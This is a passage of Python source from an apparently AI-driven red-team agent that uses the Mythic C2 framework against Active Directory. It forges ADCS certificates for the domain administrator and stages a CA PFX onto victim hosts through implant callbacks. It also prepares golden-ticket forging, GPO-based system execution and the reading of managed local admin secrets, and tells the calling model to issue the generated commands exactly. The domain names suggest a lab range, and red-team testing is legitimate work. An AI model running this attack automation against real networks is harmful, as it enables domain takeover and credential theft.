                    "reason": "MythicAPIClient not initialized. Call login() first.",
                }, sort_keys=True)
            try:
                from . import adcs_certificate_materializer
                from . import capabilities
                from . import engagement_ledger
            except ImportError:
                import adcs_certificate_materializer
                import capabilities
                import engagement_ledger

            input_values = self._capability_tool_inputs(inputs)
            action_obj = self._capability_tool_action(action, input_values, capabilities)
            if action_obj is None:
                return json.dumps({
                    "ok": False,
                    "missing": ["action"],
                    "reason": "materialize_capability_inputs needs a capability action",
                }, sort_keys=True)

            capability = self._capability_text(getattr(action_obj, "name", "")).casefold()
            if capability != "adcs-certificate-auth":
                return json.dumps({
                    "ok": False,
                    "missing": ["capability"],
                    "reason": f"runtime materializer does not support capability: {capability or '<empty>'}",
                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                }, sort_keys=True)

            await self._augment_capability_runtime_inputs(action_obj, input_values)
            await self._bind_capability_mythic_adapter(action_obj, input_values)
            domain = self._capability_target_domain(action_obj, input_values) or self._capability_domain(action_obj, input_values)
            account = self._capability_account(action_obj, input_values) or "administrator"
            callback_id = self._capability_callback_id(action_obj, input_values)
            ca_host = self._capability_text(
                input_values.get("ca_host")
                or getattr(action_obj, "intent", {}).get("ca_host")
                or self._capability_target_host_from_context({"target": getattr(action_obj, "target", "")})
            ).casefold()
            adapter_inputs = (
                input_values.get("mythic_adapter")
                if isinstance(input_values.get("mythic_adapter"), dict)
                else input_values
            )
            if not callback_id:
                return json.dumps({
                    "ok": False,
                    "missing": ["callback_id"],
                    "reason": "adcs-certificate-auth materialization needs a target callback",
                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                }, sort_keys=True)

            await self._ensure_engagement_key()
            ledger = engagement_ledger.load_runtime(self._eng_key())
            artifact_dir = Path(_engagement_state_dir()) / "artifacts"
            ca_password = self._capability_text(
                input_values.get("ca_pfx_password")
                or input_values.get("ca_cert_password")
                or input_values.get("ca_certificate_password")
                or os.environ.get("SAGE_ADCS_CA_PFX_PASSWORD")
            )
            forged_password = self._capability_text(
                input_values.get("forged_pfx_password")
                or input_values.get("forged_certificate_password")
                or input_values.get("new_cert_password")
                or input_values.get("certificate_password")
            )
            remote_path = self._capability_text(
                input_values.get("forged_pfx_path")
                or input_values.get("forged_certificate_path")
                or input_values.get("new_cert_path")
                or input_values.get("certificate_path")
            )
            remote_ca_path = self._capability_text(
                input_values.get("remote_ca_pfx_path")
                or input_values.get("staged_ca_pfx_path")
                or input_values.get("remote_ca_cert_path")
            )
            if self._capability_input_bool(adapter_inputs, "adcs_certificate_auth_compact_remote_paths"):
                if not remote_ca_path:
                    remote_ca_path = self._capability_text(
                        adapter_inputs.get("adcs_certificate_auth_compact_ca_pfx_path")
                        or r"C:\Users\Public\c.pfx"
                    )
                if not remote_path or self._capability_input_bool(input_values, "_auto_forged_pfx_path"):
                    remote_path = self._capability_text(
                        adapter_inputs.get("adcs_certificate_auth_compact_forged_pfx_path")
                        or r"C:\Users\Public\f.pfx"
                    )
            account_sid = self._capability_text(
                input_values.get("account_sid")
                or input_values.get("target_sid")
                or input_values.get("principal_sid")
            )
            if not account_sid and account.casefold() == "administrator":
                domain_sid = await self._resolve_domain_sid(domain)
                if domain_sid:
                    account_sid = f"{domain_sid}-500"
            sid_extension_encoding = self._capability_text(
                input_values.get("sid_extension_encoding")
                or input_values.get("account_sid_extension_encoding")
                or input_values.get("sid_encoding")
                or "utf8"
            )
            materialized = adcs_certificate_materializer.materialize_adcs_certificate_auth(
                ledger=ledger,
                artifact_dir=artifact_dir,
                engagement_key=self._eng_key(),
                domain=domain,
                account=account,
                ca_host=ca_host,
                callback_id=callback_id,
                account_sid=account_sid,
                sid_extension_encoding=sid_extension_encoding,
                ca_pfx_password=ca_password,
                forged_pfx_password=forged_password,
                remote_ca_pfx_path=remote_ca_path,
                remote_forged_pfx_path=remote_path,
            )
            if not materialized.ok:
                return json.dumps({
                    "ok": False,
                    "missing": materialized.missing,
                    "reason": materialized.reason,
                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                }, sort_keys=True)

            local_path = Path(str(materialized.inputs.get("_local_ca_pfx_path") or ""))
            if not local_path.is_file():
                return json.dumps({
                    "ok": False,
                    "missing": ["local_ca_pfx_path"],
                    "reason": "materializer did not resolve a local CA PFX for staging",
                }, sort_keys=True)

            merged_inputs = dict(input_values)
            merged_inputs.update(materialized.inputs)

            # NOT _register_file_dedup: the CA PFX is an engagement secret artifact. Content-hash dedup could bind
            # this operation to another engagement's file; hash-dedup is for static tool binaries only.
            file_uuid = await self._register_file(local_path.name, local_path.read_bytes())
            adapter_inputs = (
                merged_inputs.get("mythic_adapter")
                if isinstance(merged_inputs.get("mythic_adapter"), dict)
                else merged_inputs
            )
            upload_command = self._capability_text(
                merged_inputs.get("upload_command")
                or adapter_inputs.get("upload_command")
                or "upload"
            )
            file_param = self._capability_text(
                merged_inputs.get("upload_file_param")
                or adapter_inputs.get("upload_file_param")
                or "File"
            ) or "File"
            path_param = self._capability_text(
                merged_inputs.get("upload_path_param")
                or adapter_inputs.get("upload_path_param")
                or "Path"
            ) or "Path"
            registered_file_param = self._capability_text(
                merged_inputs.get("upload_registered_file_param")
                or adapter_inputs.get("upload_registered_file_param")
                or file_param
            ) or file_param
            registered_file_value_mode = self._capability_text(
                merged_inputs.get("upload_registered_file_value")
                or adapter_inputs.get("upload_registered_file_value")
                or "uuid"
            ).casefold()
            registered_file_value = local_path.name if registered_file_value_mode == "filename" else file_uuid
            upload_parameters = merged_inputs.get("upload_parameters") if isinstance(merged_inputs.get("upload_parameters"), dict) else None
            if upload_parameters:
                upload_parameters = dict(upload_parameters)
                upload_parameters.setdefault(registered_file_param, registered_file_value)
                upload_parameters.setdefault(path_param, materialized.inputs["ca_pfx_path"])
            else:
                upload_parameters = {
                    registered_file_param: registered_file_value,
                    path_param: materialized.inputs["ca_pfx_path"],
                }
            timeout_value = merged_inputs.get("timeout")
            try:
                timeout = int(timeout_value) if timeout_value not in (None, "") else None
            except (TypeError, ValueError):
                timeout = None
            self._last_issued_task_display_id = None
            try:
                upload_output = await self.upload_file_by_file_uuid(
                    upload_command,
                    upload_parameters,
                    file_uuid,
                    int(callback_id),
                    timeout=timeout,
                )
            except Exception as exc:
                return json.dumps({
                    "ok": False,
                    "missing": ["ca_pfx_upload"],
                    "reason": f"CA PFX staging upload failed before task issue: {exc}",
                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                }, sort_keys=True)
            upload_task_id = self._last_issued_task_display_id
            upload_output_text = self._capability_text(upload_output)
            upload_result_class = command_builder.classify_result(upload_command, upload_output_text)
            if upload_task_id is None or upload_result_class != command_builder.ResultClass.SUCCESS.value:
                if upload_task_id is None:
                    reason = "CA PFX staging upload did not issue a Mythic task"
                else:
                    reason = f"CA PFX staging upload returned {upload_result_class}"
                preview = upload_output_text[-800:]
                if preview:
                    reason = f"{reason}: {preview}"
                return json.dumps({
                    "ok": False,
                    "missing": ["ca_pfx_upload"],
                    "reason": reason,
                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                    "upload_output_preview": preview,
                }, sort_keys=True)

            evidence = dict(materialized.evidence)
            evidence.update({
                "mythic_file_uuid": file_uuid,
                "upload_command": upload_command,
                "upload_parameters": {
                    key: ("<file_ref>" if key == registered_file_param else value)
                    for key, value in upload_parameters.items()
                },
                "upload_task_id": upload_task_id,
                "callback_id": callback_id,
            })
            return json.dumps({
                "ok": True,
                "capability": capability,
                "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                "inputs": self._materialized_inputs_for_response(merged_inputs),
                "evidence": evidence,
                "staged": {
                    "mythic_file_uuid": file_uuid,
                    "remote_path": materialized.inputs["ca_pfx_path"],
                    "callback_id": callback_id,
                    "upload_task_id": upload_task_id,
                },
                "upload_output_preview": upload_output_text[-800:],
                "next": "Pass action and inputs to build_capability_commands, then issue the returned commands exactly.",
            }, sort_keys=True)
        except Exception as exc:
            return json.dumps({
                "ok": False,
                "missing": ["materializer"],
                "reason": str(exc),
            }, sort_keys=True)

    def _materialized_inputs_for_response(self, inputs: dict) -> dict:
        out = {}
        for key, value in inputs.items():
            if str(key).startswith("_"):
                continue
            out[key] = value
        return out

    async def _capability_build_command_payload(self, action, inputs: dict) -> dict:
        try:
            raw = await self.build_capability_commands(action, inputs)
            parsed = json.loads(raw)
            return parsed if isinstance(parsed, dict) else {
                "ok": False,
                "missing": ["builder"],
                "reason": "capability builder did not return a JSON object",
                "commands": [],
            }
        except Exception as exc:
            return {
                "ok": False,
                "missing": ["builder"],
                "reason": str(exc),
                "commands": [],
            }

    def _capability_current_context_preflight_payload(self, action, inputs: dict, capabilities_mod) -> dict:
        try:
            try:
                from . import mythic_capability_adapter
            except ImportError:
                import mythic_capability_adapter

            capability = self._capability_text(getattr(action, "name", "")).casefold()
            target_domain = (
                self._capability_target_domain(action, inputs)
                or self._capability_domain(action, inputs)
                or self._capability_source_domain(action, inputs)
                or self._capability_account_domain(action, inputs)
            )
            if not target_domain:
                return {
                    "ok": False,
                    "missing": ["domain"],
                    "reason": "current-context preflight needs a target domain",
                    "commands": [],
                }
            proof_host = self._capability_text(
                inputs.get("proof_host")
                or inputs.get("service_host")
                or inputs.get("target_host")
                or inputs.get("dc")
                or inputs.get("domain_controller")
            )
            proof_resource = self._capability_text(
                inputs.get("proof_resource")
                or inputs.get("service_resource")
                or inputs.get("target_resource")
                or inputs.get("proof_path")
                or inputs.get("proof_unc")
            )
            if not proof_resource and proof_host:
                share = "SYSVOL" if capability == "ensure-account-kerberos-context" else "C$"
                proof_resource = f"\\\\{proof_host}\\{share}"
            if not proof_resource:
                proof_resource = "{{kerberos_service_resource}}"

            steps = [
                capabilities_mod.CapabilityExecutionStep(
                    operation="kerberos-ticket-list",
                    parameters={
                        "domain": target_domain,
                        **({
                            "account": self._capability_account(action, inputs),
                        } if capability == "ensure-account-kerberos-context" and self._capability_account(action, inputs) else {}),
                        "target_context": "current",
                        "store": "current",
                    },
                    capability=self._capability_text(getattr(action, "name", "")),
                    purpose=f"inventory the current Kerberos context for {target_domain}",
                    expected_probe=(
                        "extract_account_ticket_cache_probe"
                        if capability == "ensure-account-kerberos-context"
                        else "extract_ticket_cache_probe"
                    ),
                ),
                capabilities_mod.CapabilityExecutionStep(
                    operation="kerberos-context-service-proof",
                    parameters={
                        "domain": target_domain,
                        "resource": proof_resource,
                        "target_context": "current",
                        "store": "current",
                        "action": "list",
                        "requires_import": False,
                    },
                    capability=self._capability_text(getattr(action, "name", "")),
                    purpose=(
                        "prove whether the current callback context already has required service access "
                        "before building or importing a ticket"
                    ),
                    expected_probe="extract_ticket_probe",
                    prerequisites=["context:current-kerberos-context"],
                ),
            ]
            execution_plan = capabilities_mod.CapabilityExecutionPlan(
                True,
                steps=steps,
                reason="built keyless current-context preflight plan",
            )
            adapter_config = inputs.get("mythic_adapter") if isinstance(inputs.get("mythic_adapter"), dict) else inputs
            command_plan = mythic_capability_adapter.build_mythic_capability_commands(execution_plan, adapter_config)
            return self._capability_command_plan_payload(action, execution_plan, command_plan)
        except Exception as exc:
            return {
                "ok": False,
                "missing": ["preflight_builder"],
                "reason": str(exc),
                "commands": [],
            }

    async def _ensure_capability_executor_proof_target(self, action, inputs: dict) -> None:
        capability = self._capability_text(getattr(action, "name", "")).casefold()
        if capability not in {
            "adcs-certificate-auth",
            "forge-golden-ticket",
            "gpo-controlled-system-exec",
            "ensure-kerberos-context",
            "ensure-account-kerberos-context",
        }:
            return
        if capability == "gpo-controlled-system-exec":
            intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
            explicit_proof_path = self._capability_text(inputs.get("proof_path") or intent.get("proof_path"))
            explicit_proof_unc = self._capability_text(inputs.get("proof_unc") or intent.get("proof_unc"))
            if explicit_proof_path or explicit_proof_unc:
                if explicit_proof_path:
                    inputs.setdefault("proof_path", explicit_proof_path)
                if explicit_proof_unc:
                    inputs.setdefault("proof_unc", explicit_proof_unc)
                if explicit_proof_path and not explicit_proof_unc:
                    inputs.setdefault("proof_unc", explicit_proof_path)
                if explicit_proof_unc and not explicit_proof_path:
                    inputs.setdefault("proof_path", explicit_proof_unc)
                return
            if self._capability_text(inputs.get("proof_path") or inputs.get("proof_unc")):
                return
            domain = self._capability_domain(action, inputs)
            gpo = self._capability_text(
                inputs.get("gpo")
                or inputs.get("gpo_name")
                or inputs.get("gponame")
                or intent.get("gpo")
                or intent.get("gpo_name")
                or intent.get("gponame")
            ).casefold()
            gpo_guid = self._capability_text(
                inputs.get("gpo_guid")
                or inputs.get("guid")
                or inputs.get("gpo_object_guid")
                or intent.get("gpo_guid")
                or intent.get("guid")
                or intent.get("gpo_object_guid")
            ).strip().strip("{}")
            affected_dc_hosts = {
                self._capability_text(host).split(".", 1)[0].casefold()
                for host in self._capability_list(inputs.get("affected_dc_hosts") or intent.get("affected_dc_hosts"))
                if self._capability_text(host)
            }
            affected_hosts = {
                self._capability_text(host).split(".", 1)[0].casefold()
                for host in self._capability_list(inputs.get("affected_hosts") or intent.get("affected_hosts"))
                if self._capability_text(host)
            }
            affected_hosts.update(affected_dc_hosts)
            current_host = self._capability_text(
                inputs.get("current_host")
                or inputs.get("callback_host")
                or inputs.get("foothold_host")
                or inputs.get("local_host")
            ).split(".", 1)[0].casefold()
            dedicated_proof_target = self._gpo_dedicated_proof_target(
                domain=domain,
                gpo=gpo or gpo_guid,
                current_host=current_host,
                affected_hosts=affected_hosts,
                affected_dc_hosts=affected_dc_hosts,
            )
            if dedicated_proof_target:
                proof_path, proof_unc = dedicated_proof_target
                inputs["proof_path"] = proof_path
                inputs["proof_unc"] = proof_unc
                return
            if domain and gpo_guid and (affected_dc_hosts and current_host not in affected_dc_hosts):
                slug = self._capability_slug(gpo or gpo_guid)
                proof_path = (
                    f"\\\\{domain}\\SYSVOL\\{domain}\\Policies\\{{{gpo_guid}}}"
                    f"\\Machine\\Preferences\\ScheduledTasks\\sage_gpo_{slug}_whoami.txt"
                )
                inputs["proof_path"] = proof_path
                inputs["proof_unc"] = proof_path
            return
        default_share = "SYSVOL" if capability == "ensure-account-kerberos-context" else "C$"
        if capability == "ensure-account-kerberos-context":
            self._sanitize_account_context_proof_target(action, inputs)
        self._normalize_capability_service_proof_target(action, inputs, default_share=default_share)
        if capability == "ensure-kerberos-context":
            self._sanitize_admin_context_proof_target(action, inputs, default_share=default_share)
        if self._capability_text(
            inputs.get("proof_resource")
            or inputs.get("service_resource")
            or inputs.get("target_resource")
            or inputs.get("proof_path")
            or inputs.get("proof_unc")
        ):
            return
        if capability == "adcs-certificate-auth":
            target_domain = (
                self._capability_target_domain(action, inputs)
                or self._capability_domain(action, inputs)
                or self._capability_account_domain(action, inputs)
            )
            ca_host = self._capability_text(
                inputs.get("ca_host")
                or getattr(action, "intent", {}).get("ca_host")
            )
            host = self._capability_host_name(ca_host, target_domain)
            if host:
                inputs.setdefault("proof_host", host)
                inputs.setdefault("proof_resource", f"\\\\{host}\\{default_share}")
                inputs.setdefault("proof_service", "cifs")
                return
        domain = (
            self._capability_target_domain(action, inputs)
            or self._capability_domain(action, inputs)
            or self._capability_account_domain(action, inputs)
        )
        await self._augment_capability_ticket_proof_target(inputs, domain)

    def _normalize_capability_service_proof_target(
        self,
        action,
        inputs: dict,
        *,
        default_share: str = "C$",
    ) -> None:
        """Normalize model-supplied service proof targets before the adapter emits a command."""
        if not isinstance(inputs, dict):
            return
        resource_keys = ("proof_resource", "service_resource", "target_resource", "proof_unc", "proof_path")
        resource = ""
        for key in resource_keys:
            resource = self._capability_text(inputs.get(key)).strip()
            if resource:
                break
        if not resource or self._capability_service_resource_is_explicit(resource):
            return

        normalized_resource = resource.strip().strip("\\/").rstrip(".").casefold()
        target_domain = (
            self._capability_target_domain(action, inputs)
            or self._capability_domain(action, inputs)
            or self._capability_account_domain(action, inputs)
        )
        source_domain = self._capability_source_domain(action, inputs)
        known_domains = {
            self._capability_text(item).strip().strip("\\/").rstrip(".").casefold()
            for item in (target_domain, source_domain)
            if self._capability_text(item)
        }

        if normalized_resource in known_domains:
            for key in resource_keys:
                if self._capability_text(inputs.get(key)).strip().strip("\\/").rstrip(".").casefold() == normalized_resource:
                    inputs.pop(key, None)
            return

        if any(sep in resource for sep in ("\\", "/")) or ":" in resource:
            return

        for key in resource_keys:
            if self._capability_text(inputs.get(key)).strip() == resource:
                inputs.pop(key, None)
        if not self._capability_text(inputs.get("proof_host") or inputs.get("service_host") or inputs.get("target_host")):
            host = self._capability_host_name(resource, target_domain)
            if host:
                inputs["proof_host"] = host
                inputs.setdefault("proof_resource", f"\\\\{host}\\{default_share}")
                inputs.setdefault("proof_service", "cifs")

    def _sanitize_admin_context_proof_target(
        self,
        action,
        inputs: dict,
        *,
        default_share: str = "C$",
    ) -> None:
        """Require admin-only service proof for callback-scoped privileged Kerberos contexts."""
        if not isinstance(inputs, dict):
            return
        capability = self._capability_text(getattr(action, "name", "")).casefold()
        if capability != "ensure-kerberos-context":
            return
        resource_keys = ("proof_resource", "service_resource", "target_resource", "proof_unc", "proof_path")
        selected_resource = ""
        for key in resource_keys:
            selected_resource = self._capability_text(inputs.get(key)).strip()
            if selected_resource:
                break
        if not selected_resource:
            return
        share = self._capability_service_resource_share(selected_resource)
        if share not in {"sysvol", "netlogon"}:
            return
        host = self._capability_service_resource_host(selected_resource)
        for key in resource_keys:
            inputs.pop(key, None)
        if host:
            inputs["proof_host"] = host
            inputs["proof_resource"] = f"\\\\{host}\\{default_share}"
            inputs["proof_service"] = "cifs"
        inputs["proof_target_sanitized"] = (
            f"replaced low-privileged {share.upper()} proof target; "
            "privileged Kerberos context proof requires an admin-only service"
        )

    def _sanitize_account_context_proof_target(self, action, inputs: dict) -> None:
        """Keep account-context proofs scoped to the account's own domain.

        A model may ask to prove a Seven Kingdoms account context by listing an ESSOS
        admin share. That tests authorization the account does not have and turns a
        context proof into a target-domain access proof. Account context should prove
        a TGT plus same-domain service access, normally SYSVOL on a domain controller.
        """
        if not isinstance(inputs, dict):
            return
        domain = (
            self._capability_domain(action, inputs)
            or self._capability_account_domain(action, inputs)
        )
        domain_cf = self._capability_text(domain).strip().strip(".").casefold()
        if not domain_cf:
            return
        proof_domain = self._capability_service_proof_domain(inputs)
        if not proof_domain or proof_domain == domain_cf:
            return
        for key in (
            "proof_resource",
            "service_resource",
            "target_resource",
            "proof_unc",
            "proof_path",
            "proof_host",
            "service_host",
            "target_host",
            "proof_service",
        ):
            inputs.pop(key, None)
        inputs["proof_target_sanitized"] = (
            f"discarded cross-domain proof target {proof_domain}; "
            f"account context proof is scoped to {domain_cf}"
        )

    def _capability_service_proof_domain(self, inputs: dict) -> str:
        for key in ("proof_resource", "service_resource", "target_resource", "proof_unc", "proof_path"):
            domain = self._capability_service_resource_domain(inputs.get(key))
            if domain:
                return domain
        for key in ("proof_host", "service_host", "target_host", "dc", "domain_controller"):
            _host, domain = self._capability_host_domain(inputs.get(key))
            if domain:
                return domain
        return ""

    def _capability_service_resource_domain(self, value) -> str:
        text = self._capability_text(value).strip().strip('"')
        if not text:
            return ""
        normalized = text.replace("/", "\\")
        host = ""
        if normalized.startswith("\\\\"):
            host = normalized.lstrip("\\").split("\\", 1)[0]
        else:
            low = normalized.casefold()
            for prefix in ("cifs\\", "host\\", "ldap\\", "http\\", "https\\", "wsman\\", "winrm\\"):
                if low.startswith(prefix):
                    host = normalized[len(prefix):].strip("\\").split("\\", 1)[0]
                    break
        if not host and "\\" not in normalized and ":" not in normalized:
            host = normalized
        if not host:
            return ""
        _short, domain = self._capability_host_domain(host)
        return domain

    def _capability_service_resource_host(self, value) -> str:
        text = self._capability_text(value).strip().strip('"')
        if not text:
            return ""
        normalized = text.replace("/", "\\")
        if normalized.startswith("\\\\"):
            return normalized.lstrip("\\").split("\\", 1)[0]
        low = normalized.casefold()
        for prefix in ("cifs\\", "host\\", "ldap\\", "http\\", "https\\", "wsman\\", "winrm\\"):
            if low.startswith(prefix):
                return normalized[len(prefix):].strip("\\").split("\\", 1)[0]
        return ""

    def _capability_service_resource_share(self, value) -> str:
        text = self._capability_text(value).strip().strip('"')
        if not text:
            return ""
        normalized = text.replace("/", "\\")
        if normalized.startswith("\\\\"):
            parts = normalized.lstrip("\\").split("\\")
            if len(parts) >= 2:
                return parts[1].strip().casefold()
        return ""

    def _capability_service_resource_is_explicit(self, value) -> bool:
        text = self._capability_text(value).strip().strip('"')
        if not text:
            return False
        if text.startswith("{{"):
            return True
        normalized = text.replace("/", "\\")
        if normalized.startswith("\\\\"):
            return True
        return len(normalized) >= 3 and normalized[1] == ":" and normalized[2] == "\\"

    def _capability_needs_runtime_materialization(self, action, inputs: dict) -> bool:
        capability = self._capability_text(getattr(action, "name", "")).casefold()
        if capability != "adcs-certificate-auth":
            return False
        if self._capability_input_bool(inputs, "certificate_already_forged"):
            return False
        if self._capability_input_bool(inputs, "skip_certificate_forge"):
            return False
        if self._capability_input_bool(inputs, "pre_forged_certificate"):
            return False
        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
        if any(bool(intent.get(key)) for key in ("certificate_already_forged", "skip_certificate_forge", "pre_forged_certificate")):
            return False
        if self._capability_text(
            inputs.get("ca_pfx_path")
            or inputs.get("ca_cert_path")
            or inputs.get("ca_certificate_path")
            ):
                return False
        return True

    async def _execute_capability_account_context_prerequisite(
        self,
        action,
        inputs: dict,
        callback_id: int,
        timeout: int | None,
        capabilities_mod,
    ) -> dict:
        """Ensure account-scoped capabilities run under the expected current Kerberos context."""
        capability = self._capability_text(getattr(action, "name", "")).casefold()
        if capability not in {"read-managed-local-admin-secret"}:
            return {"status": "skipped", "issued": []}
        if self._capability_input_bool(inputs, "skip_account_context_repair"):
            return {"status": "skipped", "issued": []}

        account = self._capability_account(action, inputs)
        account_domain = self._capability_account_context_domain(action, inputs)
        if not account or not account_domain:
            return {"status": "skipped", "issued": []}

        context_key = self._kerberos_account_context_key(callback_id, account, account_domain)
        if (
            context_key in getattr(self, "_kerberos_logon_account_context_keys", set())
            and context_key in getattr(self, "_kerberos_account_context_keys", set())
        ):
            return {
                "status": "achieved",
                "issued": [],
                "reason": "exact account Kerberos context is already proven in the current callback runtime",
            }
        if self._callback_current_identity_matches_account_context(callback_id, account, account_domain):
            return {
                "status": "achieved",
                "issued": [],
                "reason": "live callback already runs as the requested account context",
            }

        context_action = capabilities_mod.CapabilityAction(
            name="ensure-account-kerberos-context",
            target=f"domain={account_domain};account={account};callback={callback_id}",
            preconditions=[],
            effects=[f"kerberos-account-context:{account}@{account_domain}@callback:{callback_id}"],
            intent={
                "capability": "ensure-account-kerberos-context",
                "domain": account_domain,
                "account": account,
                "callback_id": str(callback_id),
                "policy_decision": dict(inputs.get("policy_decision") or {}),
            },
            verifier={},
            reason="refresh current callback token before account-scoped capability execution",
            source_facts=[],
        )
        context_inputs = {
            "domain": account_domain,
            "policy_decision": dict(inputs.get("policy_decision") or {}),
            "account": account,
            "callback_id": str(callback_id),
            "force_revalidate": True,
        }
        if timeout is not None:
            context_inputs["timeout"] = timeout
        raw = await self.execute_capability(context_action, context_inputs)
        try:
            payload = json.loads(raw)
        except Exception:
            payload = {
                "ok": False,
                "verdict": "failed",
                "reason": raw,
                "issued": [],
            }
        if not isinstance(payload, dict):
            payload = {
                "ok": False,
                "verdict": "failed",
                "reason": "account-context prerequisite returned a non-object result",
                "issued": [],
            }
        if payload.get("ok") is True or self._capability_text(payload.get("verdict")).casefold() == "achieved":
            return {
                "status": "achieved",
                "issued": payload.get("issued") if isinstance(payload.get("issued"), list) else [],
                "reason": payload.get("reason") or "account Kerberos context is usable",
            }
        return {
            "status": "failed",
            "verdict": payload.get("verdict") or "failed",
            "reason": payload.get("reason") or "account Kerberos context could not be refreshed",
            "issued": payload.get("issued") if isinstance(payload.get("issued"), list) else [],
        }

    async def _execute_capability_current_context_preflight(
        self,
        action,
        inputs: dict,
        callback_id: int,
        timeout: int | None,
        capabilities_mod,
    ) -> dict:
        capability = self._capability_text(getattr(action, "name", "")).casefold()
        if capability not in {
            "adcs-certificate-auth",
            "forge-golden-ticket",
            "ensure-kerberos-context",
            "ensure-account-kerberos-context",
        }:
            return {"status": "skipped", "issued": [], "ran": False}

        preflight_inputs = dict(inputs)
        if capability == "adcs-certificate-auth":
            # Build only enough of the plan to validate the current context. This avoids staging a
            # new certificate or creating another NetOnly logon session when the callback already has
            # usable service access.
            preflight_inputs.setdefault("certificate_already_forged", True)
            preflight_inputs.setdefault("skip_certificate_forge", True)
        await self._ensure_capability_executor_proof_target(action, preflight_inputs)
        if capability in {"forge-golden-ticket", "ensure-kerberos-context", "ensure-account-kerberos-context"}:
            payload = self._capability_current_context_preflight_payload(
                action,
                preflight_inputs,
                capabilities_mod,
            )
        else:
            payload = await self._capability_build_command_payload(action, preflight_inputs)
        if not payload.get("ok"):
            missing = set(payload.get("missing") or [])
            if missing and missing <= {"ca_pfx_path", "forged_pfx_path", "forged_pfx_password"}:
                return {"status": "skipped", "issued": [], "ran": False}
            return {
                "status": "failed",
                "verdict": "failed",
                "reason": payload.get("reason") or "current-context preflight build failed",
                "issued": [],
                "ran": False,
            }

        issued: list[dict] = []
        ran = False
        accumulated_probe: dict = {}
        for command_obj in list(payload.get("commands") or []):
            if not self._capability_executor_is_current_context_preflight(command_obj):
                break
            unresolved = self._capability_executor_unresolved_placeholders(command_obj)
            if unresolved:
                if self._capability_executor_is_current_context_service_proof(command_obj):
                    return {
                        "status": "not_achieved",
                        "reason": "current-context service proof target was unresolved; continuing to capability materialization",
                        "missing": sorted(unresolved),
                        "issued": issued,
                        "ran": ran,
                    }
                return {
                    "status": "failed",
                    "verdict": "failed",
                    "reason": "current-context preflight has unresolved runtime placeholders",
                    "missing": sorted(unresolved),
                    "issued": issued,
                    "ran": ran,
                }
            item = await self._execute_capability_command(
                command_obj,
                callback_id,
                timeout,
                capability_name=self._capability_text(getattr(action, "name", "")),
            )
            item["preflight"] = True
            issued.append(item)
            ran = True
            output = self._capability_text(item.get("_output"))
            expected_probe = self._capability_text(command_obj.get("expected_probe"))
            if expected_probe in {
                "extract_ticket_probe",
                "extract_account_ticket_probe",
                "extract_ticket_cache_probe",
                "extract_account_ticket_cache_probe",
            }:
                probe, verification = self._capability_executor_verify_output(
                    action,
                    preflight_inputs,
                    callback_id,
                    output,
                    command_obj,
                    capabilities_mod,
                    allow_preflight=True,
                )
                if verification is not None:
                    if probe:
                        accumulated_probe = self._capability_executor_merge_probe(accumulated_probe, probe)
                        verification = capabilities_mod.verify_capability(
                            self._capability_text(getattr(action, "name", "")),
                            accumulated_probe,
                        )
                        probe = dict(accumulated_probe)
                    item["verify_verdict"] = verification.verdict
                    item["verify_reason"] = verification.reason
                    if (
                        self._capability_executor_is_current_context_service_proof(command_obj)
                        and verification.verdict == "achieved"
                    ):
                        self._record_verified_account_kerberos_context(
                            action,
                            preflight_inputs,
                            callback_id,
                        )
                        if not self._capability_action_effects_achieved(action):
                            self.record_capability_result(
                                action,
                                probe or accumulated_probe or {},
                                evidence={
                                    "source": "execute_capability_preflight",
                                    "provenance": "run",
                                    "mythic_task_id": item.get("task_id"),
                                    "callback_id": callback_id,
                                    "command": item.get("command"),
                                },
                            )
                        return {"status": "achieved", "issued": issued, "ran": ran}
                if (
                    not self._capability_executor_is_current_context_service_proof(command_obj)
                    and self._capability_executor_task_failed(item)
                ):
                    return {
                        "status": "failed",
                        "verdict": "failed",
                        "reason": item.get("failure_reason") or "current-context inventory failed",
                        "issued": issued,
                        "ran": ran,
                    }
                continue
            if self._capability_executor_task_failed(item):
                return {
                    "status": "failed",
                    "verdict": "failed",
                    "reason": item.get("failure_reason") or "current-context inventory failed",
                    "issued": issued,
                    "ran": ran,
                }
        return {"status": "not_achieved", "issued": issued, "ran": ran}

    async def _issue_capability_callback_command(
        self,
        command_obj: dict,
        command_name: str,
        parameters,
        callback_id: int,
        timeout: int | None,
        capability_name: str = "",
    ) -> tuple[str, object, str]:
        """Issue one real callback task and report its presentation lifecycle without owning policy."""
        trace_id = self._next_capability_command_trace_id()
        await self._notify_capability_command_observer(
            trace_id=trace_id,
            status="started",
            command_obj=command_obj,
            command_name=command_name,
            parameters=parameters,
            callback_id=callback_id,
            capability_name=capability_name,
        )
        try:
            command_context = self._deterministic_capability_command_context(command_name, parameters)
            visibility_token = _task_visibility_context.set({
                "capability": capability_name,
                "purpose": command_obj.get("purpose"),
                "policy_decision": dict(command_context.get("policy_decision") or {}),
                "transaction_id": self._capability_text(command_context.get("transaction_id")),
            })
            try:
                output = await self.issue_task_and_waitfor_task_output(
                    command_name,
                    parameters,
                    callback_id,
                    timeout=timeout,
                )
            finally:
                _task_visibility_context.reset(visibility_token)
        except Exception as exc:
            await self._notify_capability_command_observer(
                trace_id=trace_id,
                status="error",
                command_obj=command_obj,
                command_name=command_name,
                parameters=parameters,
                callback_id=callback_id,
                capability_name=capability_name,
                result_preview=self._capability_executor_output_preview(str(exc)),
            )
            raise
        return output, getattr(self, "_last_issued_task_display_id", None), trace_id

    async def _complete_capability_command_trace(
        self,
        *,
        trace_id: str,
        command_obj: dict,
        command_name: str,
        parameters,
        callback_id: int,
        capability_name: str,
        item: dict,
    ) -> None:
        await self._notify_capability_command_observer(
            trace_id=trace_id,
            status="error" if self._capability_executor_task_failed(item) else "completed",
            command_obj=command_obj,
            command_name=command_name,
            parameters=parameters,
            callback_id=callback_id,
            capability_name=capability_name,
            task_id=item.get("task_id"),
            result_preview=self._capability_text(item.get("output_preview")),
        )

    async def _execute_capability_command(
        self,
        command_obj: dict,
        callback_id: int,
        timeout: int | None,
        capability_name: str = "",
    ) -> dict:
        original_command = self._capability_text(command_obj.get("command"))
        original_parameters = command_obj.get("parameters", "")
